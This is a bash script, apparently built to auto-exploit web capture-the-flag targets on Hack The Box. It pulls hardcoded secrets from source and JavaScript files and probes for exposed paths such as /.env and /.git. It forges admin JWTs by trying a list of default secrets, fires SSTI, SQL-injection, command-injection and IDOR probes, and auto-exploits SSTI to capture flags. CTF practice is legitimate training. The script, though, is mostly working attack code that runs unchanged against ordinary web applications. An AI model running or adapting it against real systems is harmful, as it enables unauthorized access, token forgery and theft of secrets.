#!/bin/bash
# pipeline.sh - Web CTF auto-exploitation pipeline
# Usage: ./pipeline.sh <target> [--http|--https] [challenge_dir]

TARGET="$1"
FORCE_PROTO="${2}"
CHALLENGE_DIR="${3}"
SCRIPTS="$(dirname "$0")"
STATE="/tmp/web_pipeline_$$"

mkdir -p "$STATE"
touch "$STATE/log"

log() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$STATE/log"; }
pass() { echo "$1" > "$STATE/$2"; }
get()  { cat "$STATE/$1" 2>/dev/null; }
flag_found() {
    local flag="$1"
    log "  [FLAG] $flag"
    log "=== FLAG CAPTURED - EXITING ==="
    echo "$flag" > "$STATE/flag.txt"
    exit 0
}

if [ -z "$TARGET" ]; then
    echo "Usage: pipeline.sh <target> [--http|--https] [challenge_dir]"
    exit 1
fi

log "=== WEB PIPELINE ==="
log "Target: $TARGET"

RAW="${TARGET#http://}"
RAW="${RAW#https://}"
HOST="${RAW%%:*}"
PORT="${RAW#*:}"
echo "$PORT" | grep -qE '^[0-9]+$' || PORT=443
BASE_PROTO="${FORCE_PROTO#--}"
[ -z "$BASE_PROTO" ] && BASE_PROTO="https"
BASE="$BASE_PROTO://$HOST:$PORT"
log "  Host: $HOST  Port: $PORT  Base: $BASE"

################################################################
# PHASE 1: RECONNAISSANCE
################################################################
log "PHASE 1: Reconnaissance"

if [ -n "$CHALLENGE_DIR" ]; then
    log "  [*] Analyzing challenge source: $CHALLENGE_DIR"
    find "$CHALLENGE_DIR" -type f \( -name '*.js' -o -name '*.py' -o -name 'Dockerfile' -o -name '*.env' -o -name '*.json' \) 2>/dev/null | while read -r srcfile; do
        name=$(basename "$srcfile")
        # Pattern 1: secret = "value" or secret: "value"
        grep -oE '(secret|jwt_secret|JWT_SECRET|SECRET_KEY|password)[[:space:]]*[:=][[:space:]]*"([^"]+)"' "$srcfile" 2>/dev/null | while IFS='=:' read -r key rest; do
            val=$(echo "$rest" | tr -d '"' | xargs | sed 's/^"//;s/"$//')
            [ -n "$val" ] && [ "$val" != "null" ] && log "  [SRC SECRET] ${key%% *}=$val (in $name)" && echo "$val" >> "$STATE/src_secrets"
        done
        # Pattern 2: const secret = "value" (with spaces)
        grep -oE "(secret|jwt_secret|JWT_SECRET|SECRET_KEY)[[:space:]]*=[[:space:]]*['\"]([A-Za-z0-9_\-]+)['\"]" "$srcfile" 2>/dev/null | sed "s/.*=[[:space:]]*['\"]//;s/['\"].*//" | while read -r val; do
            [ -n "$val" ] && log "  [SRC SECRET] secret=$val (in $name)" && echo "$val" >> "$STATE/src_secrets"
        done
    done
fi

# Live server headers
HEADERS=$(curl -skI "$BASE/" 2>/dev/null)
log "  Server: $(echo "$HEADERS" | grep -i '^server:' | sed 's/.*: //')"
log "  Tech: $(echo "$HEADERS" | grep -i '^x-powered-by:' | sed 's/.*: //')"

# Common paths
for path in /robots.txt /sitemap.xml /.well-known/ /.git/HEAD /admin /api /debug /.env /login /register; do
    CODE=$(curl -sko /dev/null -w "%{http_code}" "$BASE$path" 2>/dev/null)
    [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && log "  [PATH] $path (HTTP $CODE)"
done

# JS secrets extraction
BODY=$(curl -sk "$BASE/" 2>/dev/null)
JS_FILES=$(echo "$BODY" | grep -oE 'src="[^"]+\.js[^"]*"' | sed 's/src="//;s/"//' | head -5)
for js in $JS_FILES; do
    [ "${js:0:4}" != "http" ] && js="$BASE$js"
    JS_CONTENT=$(curl -sk "$js" 2>/dev/null)
    [ -z "$JS_CONTENT" ] && continue
    echo "$JS_CONTENT" | grep -oE '["'\''](Secret|secret|password|token|api_key|apikey|jwt|JWT)[=:]["'\'']?[A-Za-z0-9_\-]{8,}["'\'']?' 2>/dev/null | while read -r match; do
        log "  [JS SECRET] $match"
    done
    echo "$JS_CONTENT" | grep -oE '["'\''](\/)[A-Za-z0-9_\/\-]*(api|v[0-9]+)[A-Za-z0-9_\/\-]*["'\'']' 2>/dev/null | tr -d '"'\' | while read -r ep; do
        log "  [JS API] $ep"
    done
done

################################################################
# PHASE 2: JWT FORGERY
################################################################
log "PHASE 2: JWT Forgery"

# Collect secrets from source analysis and common defaults
sort -u "$STATE/src_secrets" 2>/dev/null > "$STATE/secrets.txt"
cat >> "$STATE/secrets.txt" << 'SEPLIST'
halloween-secret
SecretKey-CriticalOps-2025
supersecret
secret123
secret
mysecret
jwt_secret
jsonwebtoken
password
admin
key
private-key
SEPLIST

# Try each secret against admin endpoints
source "$SCRIPTS/jwt-forge.sh"
while IFS= read -r secret; do
    [ -z "$secret" ] && continue
    jwt_forge "$BASE" "admin" "$secret" "session_token" "silent"
done < <(sort -u "$STATE/secrets.txt")

################################################################
# PHASE 3: VULNERABILITY DETECTION
################################################################
log "PHASE 3: Vulnerability Detection"

# SSTI probes
log "  [*] Testing SSTI..."
for p in name username email search q title; do
    S=$(curl -sk "$BASE/?${p}={{7*7}}" 2>/dev/null)
    echo "$S" | grep -q "49" && log "  [+] SSTI on '$p'!" && echo "$p" > "$STATE/vuln_ssti"
done

# SQLi probes
log "  [*] Testing SQLi..."
for p in id user username page cat; do
    S=$(curl -sk "$BASE/?${p}=1'" 2>/dev/null)
    echo "$S" | grep -qiE "sql|syntax|mysql|sqlite|error" && log "  [+] SQLi on '$p'!" && echo "$p" > "$STATE/vuln_sqli"
done

# Command injection probes (POST endpoints)
log "  [*] Testing command injection..."
source "$SCRIPTS/cmd-inject.sh"
for endpoint in /update /api/update /admin/update /settings; do
    CODE=$(curl -sko /dev/null -w "%{http_code}" "$BASE$endpoint" 2>/dev/null)
    [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && cmd_inject_exploit "$BASE$endpoint" "sendMailPath" "POST" "from=x&email=x@x.com&mailProgram=sendmail"
done

# IDOR probes
log "  [*] Testing IDOR..."
for path in /api/users/1 /api/tickets/1 /api/orders/1 /user/1 /profile/1; do
    CODE=$(curl -sko /dev/null -w "%{http_code}" "$BASE$path" 2>/dev/null)
    [ "$CODE" = "200" ] && log "  [+] IDOR candidate: $path (HTTP $CODE)"
done

# Chat room IDOR
for rid in 1 2 3 4 5; do
    CBODY=$(curl -sk "$BASE/chat/?rid=$rid" 2>/dev/null)
    [ "${#CBODY}" -gt 50 ] && log "  [+] Chat room $rid accessible"
    CBODYFLAG=$(echo "$CBODY" | grep -oE 'HTB\{[^}]+\}' | head -1)
    [ -n "$CBODYFLAG" ] && flag_found "$CBODYFLAG"
done

################################################################
# PHASE 4: AUTO-EXPLOITATION
################################################################
log "PHASE 4: Auto-Exploitation"

if [ -f "$STATE/vuln_ssti" ]; then
    SSTI_PARAM=$(cat "$STATE/vuln_ssti")
    log "  [*] Exploiting SSTI on '$SSTI_PARAM'..."
    source "$SCRIPTS/ssti-exploit.sh"
    ssti_exploit "$BASE" "$SSTI_PARAM"
fi

################################################################
# PHASE 5: FLAG CAPTURE
################################################################
log "PHASE 5: Flag Capture"

FLAG=$(grep -oE 'HTB\{[^}]+\}' "$STATE/"* 2>/dev/null | head -1)
[ -n "$FLAG" ] && flag_found "$FLAG"

for ep in / /flag /flag.txt /api /admin; do
    FLAG=$(curl -sk "$BASE$ep" 2>/dev/null | grep -oE 'HTB\{[^}]+\}' | head -1)
    [ -n "$FLAG" ] && flag_found "$FLAG"
done

FLAG=$(grep -oE 'HTB\{[^}]+\}' "$STATE/log" 2>/dev/null | head -1)
if [ -z "$FLAG" ]; then
    log "  [*] No flag auto-captured. Suggestions:"
    log "    - python3 -c \"import jwt; print(jwt.encode({'username':'admin'},'<secret>',algorithm='HS256'))\""
    log "    - Check page source for hidden endpoints"
    log "    - Try password reset on /reset_password.php"
    log "    - Inspect browser JS bundles for API routes"
fi

log ""
log "=== WEB PIPELINE COMPLETE ==="
log "State: $STATE/"
